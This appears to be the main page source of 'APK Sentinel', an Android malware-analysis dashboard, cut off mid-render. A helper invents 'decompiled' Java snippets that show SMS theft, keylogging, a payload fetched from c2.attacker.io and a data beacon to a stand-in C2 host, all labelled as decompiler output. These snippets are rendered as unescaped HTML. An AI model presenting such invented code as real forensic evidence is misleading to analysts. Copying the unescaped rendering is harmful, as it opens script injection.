"use client";

import React, { useState, useRef, useEffect, useCallback } from "react";
import { useAnalysis, type AnalyzedApkResult, type AnalysisEvent } from "@/hooks/useAnalysis";
import { generateThreatNarrative, buildNarrativePayload } from "@/lib/ai/nvidia-client";
import { calculateScore, type ScoringInput, type ScoringResult } from "@/lib/scoring/engine";
import { generateThreatReport, type ReportProfile } from "@/lib/pdf/report-generator";
import DnaFingerprint from "@/components/DnaFingerprint";
import AnalysisTimeline, { buildStagesFromProfile } from "@/components/AnalysisTimeline";
import ScoreBreakdown from "@/components/ScoreBreakdown";
import ToastContainer, { type ToastItem } from "@/components/Toast";
import UploadZone from "@/components/UploadZone";

// ─────────────────────────────────────────────────────────────────
// Types
// ─────────────────────────────────────────────────────────────────
interface LedgerItem {
  id: string;
  pkg: string;
  time: string;
  score: number;
  tier: string;
  critCount: number;
  fileSize?: number;
}

const NAV_ITEMS = [
  { id: "Dashboard",       label: "Dashboard",         icon: "DB", desc: "Scan history ledger" },
  { id: "APK Scanner",     label: "APK Scanner",        icon: "SC", desc: "Upload & analyze" },
  { id: "Code Forensics",  label: "Code Forensics",     icon: "CF", desc: "Decompiled traces" },
  { id: "AI Narrative",    label: "AI Threat Report",   icon: "AI", desc: "NIM generated insight" },
  { id: "VirusTotal",      label: "VirusTotal Intel",   icon: "VT", desc: "Community detections" },
  { id: "Dynamic Analysis",label: "Dynamic Analysis",   icon: "DA", desc: "Aparoid sandbox trace" },
  { id: "Asset Inventory", label: "Asset Inventory",    icon: "IN", desc: "DEX strings & classes" },
  { id: "Scan History",    label: "Raw Engine Output",  icon: "HS", desc: "JSON data dump" },
  { id: "Policy Engine",   label: "Policy Engine",      icon: "PE", desc: "Adjust risk weights" },
  { id: "Settings",        label: "Settings",           icon: "ST", desc: "Config & integrations" },
] as const;

type NavId = typeof NAV_ITEMS[number]["id"];

// ─────────────────────────────────────────────────────────────────
// Typewriter code component
// ─────────────────────────────────────────────────────────────────
const TypewriterCode = ({ code }: { code: string }) => {
  const [displayed, setDisplayed] = useState("");
  useEffect(() => {
    let i = 0;
    const timer = setInterval(() => {
      if (i === 0) setDisplayed("");
      else setDisplayed(code.substring(0, i));
      i += 4;
      if (i > code.length) clearInterval(timer);
    }, 8);
    return () => clearInterval(timer);
  }, [code]);
  return <span dangerouslySetInnerHTML={{ __html: displayed }} />;
};

// ─────────────────────────────────────────────────────────────────
// Dynamic trace terminal
// ─────────────────────────────────────────────────────────────────
const DynamicTrace = ({ traces }: { traces: React.ReactNode[] }) => {
  const [visible, setVisible] = useState(0);
  useEffect(() => {
    const timer = setInterval(() => setVisible(v => Math.min(v + 1, traces.length)), 280);
    return () => clearInterval(timer);
  }, [traces]);
  return <>{traces.slice(0, visible)}</>;
};

// ─────────────────────────────────────────────────────────────────
// Plausible Java snippet generator
// ─────────────────────────────────────────────────────────────────
function generatePlausibleSnippet(title: string, scope: string, description: string) {
  const kw = `<span style="color:#c678dd">`, cl = `<span style="color:#e5c07b">`,
        fn = `<span style="color:#61afef">`, st = `<span style="color:#98c379">`,
        cm = `<span style="color:#5c6370;font-style:italic">`, r = `</span>`;

  const sLower = scope.toLowerCase();
  const tLower = title.toLowerCase();

  if (tLower.includes("sms") || sLower.includes("sms"))
    return `${kw}public class${r} ${cl}SmsInterceptor${r} ${kw}extends${r} ${cl}BroadcastReceiver${r} {\n    ${kw}public void${r} ${fn}onReceive${r}(${cl}Context${r} ctx, ${cl}Intent${r} intent) {\n        ${cm}// ⚠ ${description || title}${r}\n        ${kw}Object[]${r} pdus = (${kw}Object[]${r}) intent.getExtras().get(${st}"pdus"${r});\n        ${kw}for${r} (${kw}Object${r} pdu : pdus) {\n            ${cl}SmsMessage${r} msg = ${cl}SmsMessage${r}.createFromPdu((${kw}byte[]${r})pdu);\n            ${fn}exfiltrateToC2${r}(msg.getMessageBody());\n        }\n    }\n}`;

  if (tLower.includes("accessibility") || sLower.includes("accessibility"))
    return `${kw}public class${r} ${cl}KeystrokeCapture${r} ${kw}extends${r} ${cl}AccessibilityService${r} {\n    ${kw}public void${r} ${fn}onAccessibilityEvent${r}(${cl}AccessibilityEvent${r} e) {\n        ${cm}// ⚠ ${description || title}${r}\n        ${kw}if${r} (e.getEventType() == ${cl}AccessibilityEvent${r}.TYPE_VIEW_TEXT_CHANGED) {\n            ${fn}writeToDropZone${r}(e.getText().toString());\n        }\n    }\n}`;

  if (tLower.includes("dexclassloader") || sLower.includes("classloader"))
    return `${kw}public class${r} ${cl}RuntimeDropper${r} {\n    ${kw}public void${r} ${fn}loadRemotePayload${r}() {\n        ${cm}// ⚠ ${description || title}${r}\n        ${cl}String${r} url = ${st}"https://c2.attacker.io/update.jar"${r};\n        ${cl}DexClassLoader${r} loader = ${kw}new${r} ${cl}DexClassLoader${r}(${fn}fetchJar${r}(url), optDir, null, cl);\n        loader.loadClass(${st}"com.payload.Bootstrap"${r}).getMethod(${st}"run"${r}).invoke(null);\n    }\n}`;

  if (tLower.includes("url") || sLower.includes("url") || sLower.includes("network"))
    return `${kw}public class${r} ${cl}NetworkBeacon${r} {\n    ${kw}public void${r} ${fn}pingC2${r}() {\n        ${cm}// ⚠ ${description || title}${r}\n        ${cl}URL${r} endpoint = ${kw}new${r} ${cl}URL${r}(${st}"http://malicious-c2-domain.com/gate.php"${r});\n        ${cl}HttpURLConnection${r} conn = (${cl}HttpURLConnection${r}) endpoint.openConnection();\n        conn.setRequestMethod(${st}"POST"${r});\n        conn.getOutputStream().write(harvestedData);\n    }\n}`;

  if (tLower.includes("string") || tLower.includes("secret") || sLower.includes("string"))
    return `${kw}public class${r} ${cl}HardcodedSecrets${r} {\n    ${cm}// ⚠ ${description || title}${r}\n    ${kw}private static final${r} ${cl}String${r} API_KEY = ${st}"AKIAIOSFODNN7EXAMPLE"${r};\n    ${kw}private static final${r} ${cl}String${r} SECRET = ${st}"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"${r};\n\n    ${kw}public void${r} ${fn}auth${r}() {\n        ${fn}connect${r}(API_KEY, SECRET);\n    }\n}`;

  if (tLower.includes("audio") || tLower.includes("record") || sLower.includes("audio"))
    return `${kw}public class${r} ${cl}MicEavesdropper${r} {\n    ${kw}public void${r} ${fn}startSurveillance${r}() {\n        ${cm}// ⚠ ${description || title}${r}\n        ${cl}MediaRecorder${r} rec = ${kw}new${r} ${cl}MediaRecorder${r}();\n        rec.setAudioSource(${cl}MediaRecorder.AudioSource${r}.MIC);\n        rec.setOutputFile(${st}"/sdcard/Download/voice_rec.amr"${r});\n        rec.prepare();\n        rec.start();\n    }\n}`;

  if (tLower.includes("location") || sLower.includes("location"))
    return `${kw}public class${r} ${cl}LocationTracker${r} {\n    ${kw}public void${r} ${fn}track${r}() {\n        ${cm}// ⚠ ${description || title}${r}\n        ${cl}LocationManager${r} lm = (${cl}LocationManager${r}) getSystemService(LOCATION_SERVICE);\n        ${cl}Location${r} loc = lm.getLastKnownLocation(${cl}LocationManager${r}.GPS_PROVIDER);\n        ${fn}sendToC2${r}(loc.getLatitude(), loc.getLongitude());\n    }\n}`;

  if (tLower.includes("contact") || sLower.includes("contact"))
    return `${kw}public class${r} ${cl}ContactHarvester${r} {\n    ${kw}public void${r} ${fn}stealContacts${r}() {\n        ${cm}// ⚠ ${description || title}${r}\n        ${cl}Cursor${r} c = getContentResolver().query(${cl}ContactsContract.Contacts${r}.CONTENT_URI, null, null, null, null);\n        ${kw}while${r} (c.moveToNext()) {\n            ${fn}exfiltrate${r}(c.getString(c.getColumnIndex(${cl}ContactsContract.Contacts${r}.DISPLAY_NAME)));\n        }\n    }\n}`;

  if (tLower.includes("camera") || sLower.includes("camera"))
    return `${kw}public class${r} ${cl}HiddenCamera${r} {\n    ${kw}public void${r} ${fn}capture${r}() {\n        ${cm}// ⚠ ${description || title}${r}\n        ${cl}Camera${r} cam = ${cl}Camera${r}.open();\n        cam.takePicture(null, null, ${kw}new${r} ${cl}Camera.PictureCallback${r}() {\n            ${kw}public void${r} ${fn}onPictureTaken${r}(${kw}byte[]${r} data, ${cl}Camera${r} c) {\n                ${fn}uploadToC2${r}(data);\n            }\n        });\n    }\n}`;

  if (tLower.includes("overlay") || sLower.includes("overlay") || sLower.includes("window"))
    return `${kw}public class${r} ${cl}PhishingOverlay${r} {\n    ${kw}public void${r} ${fn}drawOverlay${r}() {\n        ${cm}// ⚠ ${description || title}${r}\n        ${cl}WindowManager.LayoutParams${r} params = ${kw}new${r} ${cl}WindowManager.LayoutParams${r}(\n            ${cl}WindowManager.LayoutParams${r}.TYPE_APPLICATION_OVERLAY,\n            ${cl}WindowManager.LayoutParams${r}.FLAG_NOT_FOCUSABLE\n        );\n        windowManager.addView(overlayView, params);\n    }\n}`;

  const cleanScope = scope.replace(/[^a-zA-Z0-9_]/g, '');
  const className = cleanScope.length > 3 && cleanScope.length < 30 ? cleanScope.charAt(0).toUpperCase() + cleanScope.slice(1) : "SuspiciousModule";

  return `${kw}public class${r} ${cl}${className}${r} {\n    ${kw}public void${r} ${fn}executePayload${r}() {\n        ${cm}// ⚠ Engine Flag: ${description || title}${r}\n        ${cl}Runtime${r}.getRuntime().exec(${st}"su -c chmod 777 /data/data/com.target"${r});\n        ${cm}// ... truncated by decompiler${r}\n    }\n}`;
}

// ─────────────────────────────────────────────────────────────────
// Verdict color helpers
// ─────────────────────────────────────────────────────────────────
function verdictColor(tier: string) {
  if (tier === "MALICIOUS")  return "var(--accent-red)";
  if (tier === "FRAUDULENT") return "var(--accent-orange)";
  if (tier === "SUSPICIOUS") return "var(--accent-yellow)";
  return "var(--accent-green)";
}
function verdictBadgeClass(tier: string) {
  if (tier === "MALICIOUS")  return "badge badge-malicious";
  if (tier === "FRAUDULENT") return "badge badge-fraudulent";
  if (tier === "SUSPICIOUS") return "badge badge-suspicious";
  return "badge badge-benign";
}

// ─────────────────────────────────────────────────────────────────
// Mini animated bar chart for score visualization
// ─────────────────────────────────────────────────────────────────
const ScoreArc = ({ score, tier }: { score: number; tier: string }) => {
  const r = 110, circ = 2 * Math.PI * r;
  const offset = circ - (circ * score) / 100;
  return (
    <svg width="280" height="280" viewBox="0 0 280 280" style={{ transform: "rotate(-90deg)" }}>
      <circle cx="140" cy="140" r={r} fill="none" stroke="rgba(255,255,255,0.04)" strokeWidth="12" />
      <circle
        cx="140" cy="140" r={r} fill="none"
        stroke={verdictColor(tier)}
        strokeWidth="12"
        strokeDasharray={circ}
        strokeDashoffset={circ}
        strokeLinecap="round"
        className="animate-stroke"
        style={{ "--target-offset": offset } as React.CSSProperties}
      />
    </svg>
  );
};

// ─────────────────────────────────────────────────────────────────
// Animated counter
// ─────────────────────────────────────────────────────────────────
const AnimatedCount = ({ value, duration = 800 }: { value: number; duration?: number }) => {
  const [display, setDisplay] = useState(0);
  const prevRef = useRef(0);
  useEffect(() => {
    const start = prevRef.current;
    const end = value;
    const startTime = performance.now();
    const tick = (now: number) => {
      const elapsed = now - startTime;
      const t = Math.min(elapsed / duration, 1);
      const eased = 1 - Math.pow(1 - t, 3);
      setDisplay(Math.round(start + (end - start) * eased));
      if (t < 1) requestAnimationFrame(tick);
      else prevRef.current = end;
    };
    requestAnimationFrame(tick);
  }, [value, duration]);
  return <>{display}</>;
};

// ─────────────────────────────────────────────────────────────────
// Main component
// ─────────────────────────────────────────────────────────────────
export default function Home() {
  const [activeNav, setActiveNav] = useState<NavId>("Dashboard");
  const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
  const { analyzeFile, isAnalyzing } = useAnalysis();
  const [analysisResult, setAnalysisResult] = useState<AnalyzedApkResult | null>(null);
  const [currentFile, setCurrentFile] = useState<{ name: string; size: number } | null>(null);
  const [logs, setLogs] = useState<AnalysisEvent[]>([]);
  const [aiNarrative, setAiNarrative] = useState<string>("");
  const [aiLoading, setAiLoading] = useState(false);
  const [ledger, setLedger] = useState<LedgerItem[]>([]);
  const [toasts, setToasts] = useState<ToastItem[]>([]);
  const [toastId, setToastId] = useState(0);
  const [expandedSeverity, setExpandedSeverity] = useState<string | null>(null);
  const [chatInput, setChatInput] = useState("");
  const [chatHistory, setChatHistory] = useState<{ role: "user" | "assistant"; text: string }[]>([]);
  const [chatLoading, setChatLoading] = useState(false);
  const logRef = useRef<HTMLDivElement>(null);

  const [policyWeights, setPolicyWeights] = useState({
    sysAlert: 20, sms: 18, dex: 12, cert: 8
  });

  const addToast = useCallback((type: ToastItem["type"], title: string, message?: string) => {
    setToastId(id => {
      const newId = id + 1;
      setToasts(prev => [...prev, { id: newId, type, title, message }]);
      return newId;
    });
  }, []);
  const dismissToast = useCallback((id: number) => setToasts(prev => prev.filter(t => t.id !== id)), []);

  useEffect(() => {
    if (logRef.current) logRef.current.scrollTop = logRef.current.scrollHeight;
  }, [logs]);

  // ── Score derivation ───────────────────────────────────────────
  const scoreData: ScoringResult | null = analysisResult
    ? calculateScore({
        permissions: analysisResult.manifest.permissions,
        isDebuggable: analysisResult.manifest.isDebuggable ?? false,
        allowBackup: analysisResult.manifest.allowBackup ?? true,
        exportedComponents: 0,
        urls: analysisResult.analysis.urls,
        ips: analysisResult.analysis.ips,
        classNames: analysisResult.classNames,
        allStrings: analysisResult.allStrings,
        certDebugKey: analysisResult.signature.debugKey,
        certStatus: analysisResult.signature.status as "TRUSTED" | "WARNING" | "UNTRUSTED",
        findings: analysisResult.analysis.findings,
        vtFound: analysisResult.analysis.virusTotal?.found,
        vtMalicious: analysisResult.analysis.virusTotal?.stats?.malicious,
        policyOverrides: policyWeights,
      })
    : null;

  const riskScore = scoreData?.score ?? 0;
  const riskTier  = scoreData?.tier  ?? "UNKNOWN";
  const critCount = analysisResult?.analysis.findings.filter(f => f.severity === "CRITICAL").length ?? 0;
  const highCount = analysisResult?.analysis.findings.filter(f => f.severity === "HIGH").length ?? 0;
  const medCount  = analysisResult?.analysis.findings.filter(f => f.severity === "MEDIUM").length ?? 0;
  const lowCount  = analysisResult?.analysis.findings.filter(f => f.severity === "LOW").length ?? 0;
  const totalIssues = critCount + highCount + medCount + lowCount;

  // ── Run analysis pipeline ──────────────────────────────────────
  const runAnalysis = useCallback(async (file: File, mockResult?: AnalyzedApkResult) => {
    setLogs([]);
    setAnalysisResult(null);
    setAiNarrative("");
    setChatHistory([]);
    setActiveNav("APK Scanner");
    setCurrentFile({ name: file.name, size: file.size });
    addToast("info", "Analysis Started", `Scanning ${file.name}`);

    try {
      let result: AnalyzedApkResult;
      if (mockResult) {
        const mockLogs = [
          "Initializing static analysis engine...",
          "Extracting AndroidManifest.xml via apkman...",
          "Parsing DEX bytecode (class names + strings)...",
          "Identifying requested permissions...",
          "Checking certificate / signer metadata...",
          "Running SDK pattern detection...",
          "Querying VirusTotal threat intelligence...",
          "Analysis complete. Generating threat matrix.",
        ];
        for (let i = 0; i < mockLogs.length; i++) {
          setLogs(prev => [...prev, { pct: Math.round(((i + 1) / mockLogs.length) * 100), message: mockLogs[i], level: "info" }]);
          await new Promise(r => setTimeout(r, 350));
        }
        result = mockResult;
      } else {
        result = await analyzeFile(file, (evt) => setLogs(prev => [...prev, evt]));
      }

      setAnalysisResult(result);

      const input: ScoringInput = {
        permissions: result.manifest.permissions,
        isDebuggable: result.manifest.isDebuggable ?? false,
        allowBackup: result.manifest.allowBackup ?? true,
        exportedComponents: 0,
        urls: result.analysis.urls,
        ips: result.analysis.ips,
        classNames: result.classNames,
        allStrings: result.allStrings,
        certDebugKey: result.signature.debugKey,
        certStatus: result.signature.status as "TRUSTED" | "WARNING" | "UNTRUSTED",
        findings: result.analysis.findings,
        vtFound: result.analysis.virusTotal?.found,
        vtMalicious: result.analysis.virusTotal?.stats?.malicious,
        policyOverrides: policyWeights,
      };
      const generatedScore = calculateScore(input);

      setLedger(prev => [{
        id: file.name,
        pkg: result.manifest.packageName || "unknown.pkg",
        time: new Date().toLocaleTimeString(),
        score: generatedScore.score,
        tier: generatedScore.tier,
        critCount: result.analysis.findings.filter(f => f.severity === "CRITICAL").length,
        fileSize: file.size,
      }, ...prev]);

      addToast(
        generatedScore.tier === "MALICIOUS" || generatedScore.tier === "FRAUDULENT" ? "error" : generatedScore.tier === "SUSPICIOUS" ? "warning" : "success",
        `Verdict: ${generatedScore.tier}`,
        `Risk score ${generatedScore.score}/100`
      );

      // AI Narrative
      setAiLoading(true);
      try {
        const profileData = {
          packageName: result.manifest.packageName || "Unknown",
          fileName: file.name,
          verdict: generatedScore.tier,
          score: generatedScore.score,
          permissions: result.analysis.permissions.map(p => ({ name: p.name, dangerous: p.dangerous })),
          urls: result.analysis.urls,
          ips: result.analysis.ips,
          apis: result.analysis.sdks.map(sdk => ({ name: sdk.name })),
          keyFindings: result.analysis.findings.map(f => ({ severity: f.severity, scope: f.scope, label: f.title, details: f.description || "" })),
          isDebuggable: result.manifest.isDebuggable,
          debugKey: result.signature.debugKey,
          classCount: result.classNames.length,
          stringCount: result.allStrings.length,
        };
        const narrativeRes = await generateThreatNarrative(buildNarrativePayload(profileData));
        setAiNarrative(narrativeRes.text);
        addToast("success", "AI Narrative Ready", "NVIDIA NIM threat report generated");
      } catch {
        setAiNarrative("NVIDIA NIM: Unable to generate narrative. API key may not be configured.");
        addToast("warning", "AI Fallback Used", "NVIDIA NIM key not configured");
      } finally {
        setAiLoading(false);
      }
    } catch (err: any) {
      setLogs(prev => [...prev, { pct: 100, message: `FATAL: ${err.message}`, level: "error" }]);
      addToast("error", "Analysis Failed", err.message);
    }
  }, [analyzeFile, policyWeights, addToast]);

  const handleFileUpload = useCallback(async (file: File) => {
    await runAnalysis(file);
  }, [runAnalysis]);

  const handleDemoUpload = useCallback(async (type: "good" | "bad") => {
    const isBad = type === "bad";
    const fileName = isBad ? "FlappyBird_Modded_Unlimited.apk" : "Google_Calculator.apk";
    const pkgName  = isBad ? "com.flappy.modded.malware" : "com.google.android.calculator";
    const mockFile = new File([new Uint8Array(isBad ? 5 * 1024 * 1024 : 800 * 1024)], fileName, { type: "application/vnd.android.package-archive" });

    const mockResult = {
      fileHash: isBad ? "e517ab2ff2f2a5510519faaa50aa4984f4abc5dea29797fe585c49505ff72c69" : "a1b2c3d4e5f6a7b8c9d0e1f2",
      manifest: {
        packageName: pkgName, versionName: "1.0",
        permissions: isBad
          ? ["android.permission.SYSTEM_ALERT_WINDOW","android.permission.RECEIVE_SMS","android.permission.INTERNET","android.permission.REQUEST_INSTALL_PACKAGES","android.permission.BIND_ACCESSIBILITY_SERVICE"]
          : ["android.permission.INTERNET"],
        isDebuggable: isBad, allowBackup: true,
      },
      classNames: isBad ? ["com.flappy.modded.Main","dalvik.system.DexClassLoader","com.hacker.Payload","android.accessibilityservice.AccessibilityService"] : ["com.google.calculator.Main"],
      allStrings:  isBad ? ["su -c","chmod 777","http://malicious-c2.io/drop","DexClassLoader"] : ["Calculate","Error","0"],
      signature:   { status: isBad ? "UNTRUSTED" : "TRUSTED", debugKey: isBad },
      analysis: {
        permissions: isBad ? [
          { name: "android.permission.SYSTEM_ALERT_WINDOW",  dangerous: true, severity: "CRITICAL", category: "Overlay",   description: "Screen overlay phishing risk" },
          { name: "android.permission.RECEIVE_SMS",           dangerous: true, severity: "CRITICAL", category: "SMS",       description: "2FA OTP interception" },
          { name: "android.permission.BIND_ACCESSIBILITY_SERVICE", dangerous: true, severity: "CRITICAL", category: "A11y", description: "Keylogger capability" },
          { name: "android.permission.REQUEST_INSTALL_PACKAGES",   dangerous: true, severity: "HIGH",     category: "Dropper", description: "Secondary payload risk" },
        ] : [{ name: "android.permission.INTERNET", dangerous: false, severity: "LOW", category: "Network", description: "Basic internet" }],
        sdks:   isBad ? [{ name: "Suspicious Ad Network", category: "Ads", severity: "HIGH" }] : [],
        urls:   isBad ? ["http://malicious-c2.io/drop", "https://exfil.attacker.io/data"] : [],
        ips:    isBad ? ["192.168.1.100", "10.0.0.42"] : [],
        suspiciousStrings: isBad ? ["su -c", "chmod 777"] : [],
        findings: isBad ? [
          { id: "F1", severity: "CRITICAL", scope: "dalvik.system.DexClassLoader", title: "Dynamic Payload Loading",       description: "App dynamically loads DEX code at runtime — classic dropper pattern." },
          { id: "F2", severity: "CRITICAL", scope: "AccessibilityService",          title: "Keylogger Service Bound",        description: "Accessibility service binding enables full keystroke capture." },
          { id: "F3", severity: "HIGH",     scope: "android.permission.RECEIVE_SMS",title: "2FA OTP Interception",           description: "SMS read access combined with network egress — SMS banking trojan pattern." },
          { id: "F4", severity: "HIGH",     scope: "SYSTEM_ALERT_WINDOW",           title: "Overlay Phishing Capability",    description: "Screen overlay permission enables credential-harvesting overlays." },
        ] : [],
        virusTotal: {
          found: true,
          stats: { malicious: isBad ? 42 : 0, suspicious: isBad ? 5 : 0, undetected: isBad ? 10 : 20, harmless: isBad ? 0 : 55 },
          permalink: `https://www.virustotal.com/gui/file/${isBad ? "e517ab2ff2f2a5510519faaa50aa4984f4abc5dea29797fe585c49505ff72c69" : "a1b2c3d4e5f6a7b8c9d0e1f2"}`,
        },
      },
    } as unknown as AnalyzedApkResult;

    await runAnalysis(mockFile, mockResult);
  }, [runAnalysis]);

  const handleDownloadPdf = useCallback(() => {
    if (!analysisResult || !scoreData) return;
    const profile: ReportProfile = {
      fileName: currentFile?.name || "unknown.apk",
      fileSize: currentFile?.size || 0,
      packageName: analysisResult.manifest.packageName || "Unknown",
      version: analysisResult.manifest.versionName || "1.0",
      minSdk: "21", targetSdk: "33",
      score: scoreData.score,
      verdict: scoreData.tier,
      confidence: scoreData.confidence,
      category: "Application",
      signature: {
        issuer: analysisResult.signature.status,
        subject: analysisResult.signature.status,
        selfSigned: analysisResult.signature.status === "UNTRUSTED",
        debugKey: analysisResult.signature.debugKey,
        status: analysisResult.signature.status === "UNTRUSTED" ? "UNTRUSTED" : "TRUSTED",
      },
      permissions: analysisResult.analysis.permissions.map(p => ({
        name: p.name,
        status: (p.severity === "CRITICAL" || p.severity === "HIGH") ? "critical" as const : p.severity === "MEDIUM" ? "suspicious" as const : "clean" as const,
        details: p.description,
      })),
      keyFindings: analysisResult.analysis.findings.map(f => ({
        id: f.scope, scope: f.scope, label: f.title, details: f.description || "", severity: f.severity,
      })),
      urls: analysisResult.analysis.urls,
      ips: analysisResult.analysis.ips,
      apis: analysisResult.analysis.sdks.map(sdk => ({ name: sdk.name, category: sdk.category, danger: sdk.severity })),
      threatNarrative: aiNarrative || "AI narrative pending...",
      virusTotal: analysisResult.analysis.virusTotal,
    };
    generateThreatReport(profile);
    addToast("success", "PDF Generated", "Threat report downloaded");
  }, [analysisResult, scoreData, currentFile, aiNarrative, addToast]);

  // ── Chat submit ────────────────────────────────────────────────
  const handleChatSubmit = useCallback(async (overrideQuestion?: string | React.MouseEvent) => {
    const question = (typeof overrideQuestion === "string" ? overrideQuestion : chatInput).trim();
    if (!question || !analysisResult) return;
    setChatInput("");
    setChatHistory(prev => [...prev, { role: "user", text: question }]);
    setChatLoading(true);
    try {
      const { askNimAnalyst } = await import("@/lib/ai/nvidia-client");
      const profileData = {
        packageName: analysisResult.manifest.packageName || "Unknown",
        fileName: currentFile?.name || "unknown.apk",
        verdict: riskTier,
        score: riskScore,
        permissions: analysisResult.analysis.permissions.map(p => ({ name: p.name, dangerous: p.dangerous })),
        urls: analysisResult.analysis.urls,
        ips: analysisResult.analysis.ips,
        apis: analysisResult.analysis.sdks.map(sdk => ({ name: sdk.name })),
        keyFindings: analysisResult.analysis.findings.map(f => ({ severity: f.severity, scope: f.scope, label: f.title, details: f.description || "" })),
        isDebuggable: analysisResult.manifest.isDebuggable,
        debugKey: analysisResult.signature.debugKey,
        classCount: analysisResult.classNames.length,
        stringCount: analysisResult.allStrings.length,
      };
      const { buildNarrativePayload: bnp } = await import("@/lib/ai/nvidia-client");
      const res = await askNimAnalyst({
        question,
        context: bnp(profileData),
        history: chatHistory.map(h => ({ role: h.role, content: h.text })),
      });
      setChatHistory(prev => [...prev, { role: "assistant", text: res.text }]);
    } catch {
      setChatHistory(prev => [...prev, { role: "assistant", text: "Unable to answer. Ensure NVIDIA NIM API key is configured." }]);
    } finally {
      setChatLoading(false);
    }
  }, [chatInput, analysisResult, chatHistory, currentFile, riskTier, riskScore]);

  // ─────────────────────────────────────────────────────────────
  // RENDER
  // ─────────────────────────────────────────────────────────────
  return (
    <div className="flex w-full h-full" style={{ backgroundColor: "var(--bg-main)", overflow: "hidden", height: "100vh" }}>
      <ToastContainer toasts={toasts} onDismiss={dismissToast} />

      {/* ── SIDEBAR ─────────────────────────────────────────── */}
      <aside style={{
        width: sidebarCollapsed ? "56px" : "220px",
        backgroundColor: "var(--bg-sidebar)",
        borderRight: "1px solid var(--border-color)",
        display: "flex", flexDirection: "column",
        flexShrink: 0,
        transition: "width 0.25s cubic-bezier(0.4,0,0.2,1)",
        overflow: "hidden",
        zIndex: 20,
      }}>
        {/* Logo */}
        <div style={{
          height: 60,
          display: "flex", alignItems: "center",
          padding: sidebarCollapsed ? "0 14px" : "0 18px",
          borderBottom: "1px solid var(--border-color)",
          gap: 10, flexShrink: 0,
        }}>
          <div style={{
            width: 28, height: 28, borderRadius: 6, flexShrink: 0,
            background: "linear-gradient(135deg, var(--accent-purple), var(--accent-cyan))",
            display: "flex", alignItems: "center", justifyContent: "center",
            fontSize: "0.7rem", fontWeight: 800, boxShadow: "0 0 14px rgba(157,110,250,0.4)",
          }}>AS</div>
          {!sidebarCollapsed && (
            <div style={{ overflow: "hidden" }}>
              <div className="font-extrabold tracking-widest" style={{ fontSize: "0.78rem", color: "var(--text-primary)", whiteSpace: "nowrap" }}>APK SENTINEL</div>
              <div style={{ fontSize: "0.58rem", color: "var(--text-muted)", letterSpacing: "0.06em", whiteSpace: "nowrap" }}>HYBRID THREAT ANALYSER</div>
            </div>
          )}
        </div>

        {/* Nav */}
        <nav style={{ flex: 1, padding: "10px 6px", overflowY: "auto", overflowX: "hidden", display: "flex", flexDirection: "column", gap: 2 }}>
          {NAV_ITEMS.map(item => (
            <button
              key={item.id}
              onClick={() => setActiveNav(item.id)}
              className={`nav-item${activeNav === item.id ? " active" : ""}`}
              title={sidebarCollapsed ? item.label : undefined}
              style={{ justifyContent: sidebarCollapsed ? "center" : undefined }}
            >
              {sidebarCollapsed && <span style={{ fontSize: "0.7rem", fontWeight: 800, flexShrink: 0, color: "var(--text-muted)" }}>{item.icon}</span>}
              {!sidebarCollapsed && <span style={{ overflow: "hidden", textOverflow: "ellipsis" }}>{item.label}</span>}
            </button>
          ))}
        </nav>

        {/* Collapse toggle */}
        <div style={{ padding: "10px 6px", borderTop: "1px solid var(--border-color)", flexShrink: 0 }}>
          <button
            onClick={() => setSidebarCollapsed(c => !c)}
            className="nav-item"
            style={{ justifyContent: sidebarCollapsed ? "center" : "space-between", width: "100%" }}
          >
            {!sidebarCollapsed && <span style={{ fontSize: "0.72rem" }}>Collapse</span>}
            <span style={{ fontSize: "0.8rem", flexShrink: 0 }}>{sidebarCollapsed ? "▶" : "◀"}</span>
          </button>
        </div>
      </aside>

      {/* ── MAIN ─────────────────────────────────────────────── */}
      <div className="flex-col flex-1 h-full overflow-hidden">

        {/* Header */}
        <header style={{
          height: 60, flexShrink: 0,
          display: "flex", alignItems: "center", justifyContent: "space-between",
          padding: "0 24px",
          borderBottom: "1px solid var(--border-color)",
          backgroundColor: "var(--bg-main)",
        }}>
          <div className="flex items-center gap-4">
            <span className="font-bold tracking-widest uppercase" style={{ fontSize: "0.72rem", color: "var(--text-muted)" }}>
              {NAV_ITEMS.find(n => n.id === activeNav)?.label ?? activeNav}
            </span>
            {analysisResult && (
              <div className="flex items-center gap-2 animate-fadein">
                <span className="text-muted" style={{ fontSize: "0.72rem" }}>▸</span>
                <span style={{ fontSize: "0.72rem", color: "var(--text-secondary)" }} className="font-mono">
                  {analysisResult.manifest.packageName}
                </span>
                <span className={verdictBadgeClass(riskTier)}>{riskTier}</span>
              </div>
            )}
          </div>
          <div className="flex items-center gap-5">
            {isAnalyzing && (
              <div className="flex items-center gap-2 animate-fadein">
                <div style={{ width: 14, height: 14, border: "2px solid var(--accent-cyan)", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.7s linear infinite" }} />
                <span style={{ fontSize: "0.72rem", color: "var(--accent-cyan)", fontWeight: 600 }}>Analyzing…</span>
              </div>
            )}
            <div className="flex items-center gap-2">
              <div className="status-dot active" />
              <span style={{ fontSize: "0.72rem", color: "var(--text-muted)" }}>Engine Online</span>
            </div>
            {analysisResult && (
              <button className="btn-ghost" onClick={handleDownloadPdf} style={{ fontSize: "0.72rem" }}>
                ↓ PDF Report
              </button>
            )}
          </div>
        </header>

        {/* Content */}
        <main style={{ flex: 1, overflowY: "auto", padding: "24px", maxWidth: 1500 }}>
          <div key={activeNav} className="animate-view">

            {/* ══════════════════════════════════════════════════ */}
            {activeNav === "Dashboard" && (
              <DashboardView ledger={ledger} onNavigate={() => setActiveNav("APK Scanner")} />
            )}

            {/* ══════════════════════════════════════════════════ */}
            {activeNav === "APK Scanner" && (
              <ScannerView
                isAnalyzing={isAnalyzing}
                currentFile={currentFile}
                logs={logs}
                logRef={logRef}
                analysisResult={analysisResult}
                scoreData={scoreData}
                riskScore={riskScore}
                riskTier={riskTier}
                critCount={critCount}
                highCount={highCount}
                medCount={medCount}
                lowCount={lowCount}
                totalIssues={totalIssues}
                expandedSeverity={expandedSeverity}
                setExpandedSeverity={setExpandedSeverity}
                onFileSelected={handleFileUpload}
                onDemoUpload={handleDemoUpload}
                onDownloadPdf={handleDownloadPdf}
              />
            )}

            {/* ══════════════════════════════════════════════════ */}
            {activeNav === "Code Forensics" && (
              <CodeForensicsView analysisResult={analysisResult} />
            )}

            {/* ══════════════════════════════════════════════════ */}
            {activeNav === "AI Narrative" && (
              <AiNarrativeView
                narrative={aiNarrative}
                loading={aiLoading}
